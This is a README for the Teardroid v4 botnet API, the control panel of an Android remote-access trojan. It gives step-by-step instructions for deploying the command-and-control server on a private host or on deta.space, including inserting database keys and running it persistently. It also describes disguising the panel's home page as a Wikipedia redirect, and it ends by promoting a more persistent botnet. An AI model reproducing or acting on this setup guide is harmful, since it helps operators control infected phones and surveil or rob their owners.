# Teardroidv4_api

Teardroid v4 Botnet API

This api is for teardroid v4 botnet

Please visit https://github.com/ScRiPt1337/Teardroid-phprat to know about teardroid and how to use it

### Run control panel on your own server (recommended)

- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below

```bash
$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
```

- Install uvicorn

```bash
$ sudo apt-get install uvicorn
$ sudo apt-get install python3
$ sudo apt-get install python3-pip
$ python3 -m pip install uvicorn
```

- Change dir to Teardroidv4_api

```bash
$ cd Teardroidv4_api
```

- Install all dependency

```bash
$ pip install -r requirements.txt
```

- change project key to connect with database
- Set up an account at [deta.space](https://deta.space/) and go to collections click on new collection
- give it a random name and click on create collection
- it will redirect to the collection page now click on collection settings and click on create data key
- it will create a new data key copy it and replace DETA_PROJECT_KEY with the key inside database.py

```bash
$ nano ./db/database.py
from deta import Deta
from os import getenv

deta = Deta(getenv("DETA_PROJECT_KEY")) => deta =  Deta("demo project key")
# replace getenv("DETA_PROJECT_KEY") with your deta.sh project key
# make sure your remove getenv
```
- Run teardroid api

```bash
$ screen
# press enter to go inside the screen session
$ uvicorn main:app --host 0.0.0.0 --port 80
# now close your terminal windows  and we are good to go
```

### Run control panel on deta.space (not recommended anymore)

- Create a account on https://deta.space
- Download teardroid control panel api from => [click here](https://github.com/ScRiPt1337/Teardroidv4_api/archive/refs/heads/main.zip)
- unzip the zip file go inside the unziped folder and open a cmd there
- run setup.py script using the command below 

```bash
$ python setup.py # for Windows
$ python3 setup.py # for Linux
```
- it will open deta.space on your browser and ask you to click on the search bar and click on setting then generate access token
- copy the access token and paste it in the terminal or cmd
- it will setup the panel for you automatically and give you the panel url at the end when the deployment is done
- your home page will redirect you to wikipedia
- add /v4 at the end of your panel url to access teardroid control panel

### Need something more advanced try ( scatter alfa )
- If you're looking for a reliable and stable botnet that can meet your advanced needs, I would highly recommend taking a look at Scatter Alfa. Scatter Alfa has been specifically designed to provide advanced functionality and persistence over an extended period of time, making it an ideal choice for users who require persistence and stability.
- [Learn more about scatter alfa](https://github.com/ScRiPt1337/Teardroid-phprat/blob/master/advanced.md)